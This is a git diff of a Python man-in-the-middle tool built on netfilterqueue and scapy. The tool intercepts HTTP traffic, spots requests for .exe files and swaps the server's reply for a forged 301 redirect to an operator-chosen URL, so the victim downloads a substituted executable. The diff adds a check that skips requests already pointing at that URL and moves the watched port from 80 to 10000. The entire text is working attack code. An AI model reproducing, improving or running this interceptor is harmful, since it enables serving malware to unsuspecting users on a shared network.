@@ -1,6 +1,7 @@
 import netfilterqueue
 import scapy.all as scapy
 import argparse
+from urlparse import urlparse
 
 ack_list = []
 
@@ -15,7 +16,7 @@ def get_arguments():
 
 def change_payload(packet, url):
     packet[scapy.Raw].load = """HTTP/1.1 301 Moved Permanently
-                                Location: {}\n""".format(url)
+                             Location: {}\n""".format(url)
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
@@ -24,13 +25,15 @@ def change_payload(packet, url):
 
 def replace_file(packet):
     options = get_arguments()
+    parsed_url = urlparse(options.url)
     http_packet = scapy.IP(packet.get_payload())
     if http_packet.haslayer(scapy.Raw):
-        print(http_packet.show())
-        if http_packet[scapy.TCP].dport == 80:
-            if ".exe" in http_packet[scapy.Raw].load:
+        if http_packet[scapy.TCP].dport == 10000:
+            if ".exe" in http_packet[scapy.Raw].load and \
+               parsed_url.netloc not in http_packet[scapy.Raw].load:
+                print("[+] exe requested")
                 ack_list.append(http_packet[scapy.TCP].ack)
-        elif http_packet[scapy.TCP].sport == 80:
+        elif http_packet[scapy.TCP].sport == 10000:
             if http_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(http_packet[scapy.TCP].seq)
                 print("Replacing file")
